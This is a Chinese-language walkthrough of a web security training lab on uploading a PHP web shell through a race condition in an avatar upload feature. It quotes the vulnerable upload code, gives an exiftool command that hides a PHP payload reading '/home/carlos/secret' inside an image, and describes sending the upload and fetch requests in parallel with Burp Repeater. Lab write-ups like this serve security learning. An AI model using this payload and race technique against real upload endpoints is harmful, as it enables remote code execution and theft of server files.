# 实验：通过竞争条件上传 Web Shell

本实验包含一个存在漏洞的图片上传功能。虽然它对上传的任何文件执行了健壮的验证，但可以通过利用其处理文件方式中的竞争条件来完全绕过此验证。

要解决本实验，请上传一个基本的 PHP Web Shell，然后使用它来泄露文件 `/home/carlos/secret` 的内容。使用实验横幅中提供的按钮提交该 secret。

您可以使用以下凭据登录您的账户：`wiener:peter`

**提示**

引入此竞争条件的漏洞代码如下：

```php
<?php
// 文件路径拥有固定前缀，拼接用户输入
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
// 此处将文件从未知的 tmp_name 移动到已知的拼接路径
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

// 若通过检测则打印成功信息，否则删除文件
if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
```

## 步骤

进行提示提供的代码审查
- 流程
    1. 文件上传到目录
    2. 进行检测
    3. 若未通过则删除
- 分析
    - 载荷文件在被删除之前短暂存在于已知目录，尝试对上传载荷与请求载荷两步进行竞争条件测试

上传普通 jpg
- 提交端点
    ```http
    POST /my-account/avatar HTTP/2
    ```
- 响应
    `The file avatars/grapefruit-slice.jpg has been uploaded.`

- 返回账户后请求头像的端点
    ```http
    GET /files/avatars/grapefruit-slice.jpg HTTP/2
    ```

竞争条件
- 设置载荷文件，使用 exiftool 添加载荷到元数据，尝试增加代码检测时间以增大可用时间窗口
    ```bash
    exiftool fruit.jpg -o payload_img.php -comment="<?php echo  'AAA' . file_get_contents('/home/carlos/secret') . 'ZZZ'; ?>"
    ```
- 提交载荷文件，并将请求条目设置到重复器
- 将普通头像请求设置到重复器，并修改路径中的文件名
    `GET /files/avatars/payload_img.php HTTP/2`
    - 注意，此处的文件被放置到 `avatarts/文件名/文件名` 路径中
- 将两个条目设置为1组，设置发送方式为“单包攻击”，使得组内条目最后的字节同时发送以增加成功几率。并增加头像请求条目的组内数量
- 发送后查看这批请求条目的响应
    - 几个条目得到代码执行数据
        `AAAgrMb73Lu9kqMcHlRh0YW9oo8PG38eSUKZZZ`

> 最初访问 `GET /files/avatars/payload_img.php/payload_img.php HTTP/2` 可成功找到代码文件，似乎由于路径修复配置：在指定路径找不到时向上继续查找

示例解决方案使用扩展 Turbo Intruder 的相似方式同时发送最后一字节执行竞争条件攻击
